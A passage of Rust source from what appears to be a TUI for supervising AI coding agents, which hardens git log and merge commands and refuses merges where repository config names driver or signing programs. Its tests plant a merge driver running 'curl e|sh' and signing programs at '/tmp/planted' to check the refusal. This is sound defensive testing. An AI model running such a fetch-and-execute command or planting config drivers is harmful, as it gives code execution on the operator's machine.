        let rest = l.strip_prefix("marion: root ")?;
        rest.split_whitespace().next().map(str::to_string)
    })
}

/// The name a harness is shown and matched under — the one doctor's rows carry (`doctor::label`):
/// its command name, followed by the agent a type names where it names one (`acp opencode`). Read
/// off the type's data, as doctor reads its row's, never off which harness it is.
fn harness_name(h: marion_core::harness::Harness, agent: Option<&str>) -> String {
    match agent {
        Some(a) => format!("{} {a}", h.cli_name()),
        None => h.cli_name().to_string(),
    }
}

/// Doctor's rows for one probe, as the home screen's entries: one per label, its readiness from
/// the node row by doctor's own rule, its surfaces from every row.
fn harnesses_of(rows: &[doctor::Row]) -> Vec<Harness> {
    rows.iter()
        .filter(|r| r.role == SurfaceRole::Node)
        .map(|r| {
            let name = doctor::label(r);
            let pane = rows
                .iter()
                .any(|p| p.role == SurfaceRole::Pane && doctor::label(p) == name);
            let (ready, note, fix) = match doctor::why_not_ready(r) {
                None => (Ready::Ready, "ready".to_string(), None),
                Some(_) if doctor::not_installed(r) => (
                    Ready::Absent,
                    "not installed".to_string(),
                    Some("install it on $PATH, then `r` to re-check".to_string()),
                ),
                Some(why) => (
                    Ready::Broken,
                    why,
                    Some("`marion doctor` says why; fix it, then `r` to re-check".to_string()),
                ),
            };
            let detail = r
                .report
                .notes
                .iter()
                .filter_map(|n| {
                    let (k, v) = n.split_once(": ")?;
                    matches!(k, "binary" | "version" | "approval")
                        .then(|| (k.to_string(), v.to_string()))
                })
                .collect();
            Harness {
                name,
                version: r.report.harness_version.clone(),
                ready,
                note,
                surfaces: if pane { "headless, pane" } else { "headless" }.into(),
                pane,
                fix,
                detail,
            }
        })
        .collect()
}

/// `git log -p` of what `branch` added over HEAD, for the operator to read: `d` here, and `marion
/// diff`. A child's branch can carry a `.gitattributes` naming a diff driver, so the patch is shown
/// raw: no textconv program and no external diff runs over the child's content.
pub fn branch_log(repo: &Path, branch: &str) -> std::process::Command {
    git_in(repo, &Effect::Diff(branch.to_string()))
}

/// `git merge --no-ff -- <branch>` in `repo`, hardened as [`git_in`] runs it: `m` here after its
/// `y`, and `marion merge`. Refused, with why, where the repository's own config names a program
/// a merge would run ([`merge_refusal`]).
pub fn branch_merge(repo: &Path, branch: &str) -> Result<std::process::Command, String> {
    match merge_refusal(repo) {
        Some(why) => Err(why),
        None => Ok(git_in(repo, &Effect::Merge(branch.to_string()))),
    }
}

/// The signing programs a merge commit would run: `gpg.program`, each `gpg.<format>.program`
/// and `gpg.ssh.defaultKeyCommand` (git lowercases the key names it lists).
const SIGNING_PROGRAMS: &str = r"^gpg\.(([^.]*\.)?program|ssh\.defaultkeycommand)$";

/// Why the TUI will not merge in `repo`, or `None`: the repository's own configuration names a
/// filter or merge driver ([`crate::gitcmd::repo_drivers`]) or a signing program
/// ([`SIGNING_PROGRAMS`]) — a program a merge would run as the operator, set where a child could
/// have set it — or git could not say whether it does. The operator's own (global) signing stays.
fn merge_refusal(repo: &Path) -> Option<String> {
    let keys = crate::gitcmd::repo_drivers(repo).and_then(|mut keys| {
        keys.extend(crate::gitcmd::local_keys(repo, SIGNING_PROGRAMS)?);
        Ok(keys)
    });
    match keys {
        Ok(keys) if keys.is_empty() => None,
        Ok(keys) => Some(
            marion_core::text::visible(&format!(
                "not merged: this repository's own config sets {}, a program a merge would run; \
             remove it (git config --unset) or merge by hand",
                keys.join(", ")
            ))
            .into_owned(),
        ),
        Err(e) => Some(format!(
            "not merged: could not read the repository's config: {}",
            marion_core::text::visible(&e)
        )),
    }
}

/// What [`git_in`] sets over the repository's configuration, which is shared with every worktree a
/// child wrote in, so any program it names may be one a child planted, run here as the operator
/// outside any sandbox: no pager, no hooks, no editor (a merge takes git's own message), no
/// global attributes file, attributes read from `HEAD` (the operator's commit, not the branch
/// being merged, so a branch's `.gitattributes` selects no driver), and no automatic gc or
/// maintenance after it ([`crate::gitcmd::NO_MAINTENANCE`]). The operator's own hooks do
/// not run on a merge made here; their own signing does, and [`merge_refusal`] refuses a signing
/// program the repository's configuration names.
const TUI_GIT_HARDENING: &[&str] = &[
    "--no-pager",
    "--attr-source=HEAD",
    "-c",
    "core.hooksPath=/dev/null",
    "-c",
    "core.editor=true",
    "-c",
    "core.attributesFile=/dev/null",
];

/// **The command line `effect` shows the operator ([`Effect::argv`]), run in `repo` with the
/// terminal**, so what the box says and what runs cannot drift apart. Through
/// [`crate::gitcmd::command`] as the operator's checkout, with [`TUI_GIT_HARDENING`] on top.
fn git_in(repo: &Path, effect: &Effect) -> std::process::Command {
    let argv = effect.argv().unwrap_or_default();
    let mut args = TUI_GIT_HARDENING.to_vec();
    args.extend(crate::gitcmd::NO_MAINTENANCE);
    args.extend(argv.iter().skip(1).map(String::as_str));
    let mut c = crate::gitcmd::command(&crate::gitcmd::Tree::Operator(repo), &args)
        .expect("an operator checkout is never refused");
    c.stdin(std::process::Stdio::inherit())
        .stdout(std::process::Stdio::inherit())
        .stderr(std::process::Stdio::inherit());
    c
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The branch log the home screen hands the operator runs no program a branch names.
    #[test]
    fn the_branch_log_runs_no_textconv_or_external_diff() {
        let c = branch_log(Path::new("/r"), "marion/t-1");
        let args: Vec<String> = c
            .get_args()
            .map(|a| a.to_string_lossy().into_owned())
            .collect();
        assert!(args.contains(&"--no-textconv".to_string()), "{args:?}");
        assert!(args.contains(&"--no-ext-diff".to_string()), "{args:?}");
        assert_eq!(args.last().map(String::as_str), Some("HEAD..marion/t-1"));
        assert!(args.contains(&"--no-pager".to_string()), "{args:?}");
    }

    /// **The merge that runs is the line the box showed**, `--` before the branch included, so a
    /// branch named like a flag is merged as a branch.
    #[test]
    fn the_merge_runs_the_line_the_box_shows() {
        let c = git_in(Path::new("/r"), &Effect::Merge("-x".into()));
        let args: Vec<String> = c
            .get_args()
            .map(|a| a.to_string_lossy().into_owned())
            .collect();
        assert_eq!(
            args,
            [
                "-c",
                "core.fsmonitor=false",
                "--no-pager",
                "--attr-source=HEAD",
                "-c",
                "core.hooksPath=/dev/null",
                "-c",
                "core.editor=true",
                "-c",
                "core.attributesFile=/dev/null",
                "-c",
                "gc.auto=0",
                "-c",
                "maintenance.auto=false",
                "merge",
                "--no-ff",
                "--",
                "-x"
            ]
        );
        assert_eq!(c.get_current_dir(), Some(Path::new("/r")));
        for redirect in marion_harness::env_filter::GIT_REDIRECTING {
            assert!(
                c.get_envs().any(|(k, v)| k == redirect && v.is_none()),
                "{redirect} is cleared"
            );
        }
    }

    /// **The TUI will not merge where the repository's own config names a driver program**, and
    /// merges where it names none.
    #[test]
    fn a_planted_driver_in_the_repository_config_refuses_the_merge() {
        let dir = marion_testsupport::scratch("tui-merge-driver");
        let git = |args: &[&str]| {
            assert!(
                marion_harness::env_filter::git_command()
                    .current_dir(&dir)
                    .args(args)
                    .status()
                    .unwrap()
                    .success()
            )
        };
        git(&["init", "-q"]);
        assert_eq!(merge_refusal(&dir), None);
        git(&["config", "merge.evil.driver", "sh -c 'curl e|sh' %A"]);
        let why = merge_refusal(&dir).expect("refused");
        assert!(why.contains("merge.evil.driver"), "{why}");
    }

    /// **The TUI will not merge where the repository's own config names a signing program**, any
    /// of the three a merge commit could run, while a plain signing setting there is no program.
    #[test]
    fn a_planted_signing_program_in_the_repository_config_refuses_the_merge() {
        let dir = marion_testsupport::scratch("tui-merge-signing");
        let git = |args: &[&str]| {
            assert!(
                marion_harness::env_filter::git_command()
                    .current_dir(&dir)
                    .args(args)
                    .status()
                    .unwrap()
                    .success()
            )
        };
        git(&["init", "-q"]);
        git(&["config", "commit.gpgSign", "true"]);
        git(&["config", "gpg.format", "ssh"]);
        assert_eq!(merge_refusal(&dir), None);
        for (key, named) in [
            ("gpg.program", "gpg.program"),
            ("gpg.ssh.program", "gpg.ssh.program"),
            ("gpg.ssh.defaultKeyCommand", "gpg.ssh.defaultkeycommand"),
        ] {
            git(&["config", key, "/tmp/planted"]);
            let why = merge_refusal(&dir).expect("refused");
            assert!(why.contains(named), "{why}");
            git(&["config", "--unset", key]);
        }
    }

    #[test]
    fn the_started_root_is_read_off_runs_own_line() {
        assert_eq!(
            started_root("marion: root 01a0-3c33 (codex) started, detached; …").as_deref(),
            Some("01a0-3c33")
        );
        assert_eq!(
            started_root("noise\nmarion: root abc (claude, pane) started").as_deref(),
            Some("abc")
        );
        assert_eq!(started_root("marion: nothing"), None);
    }
}
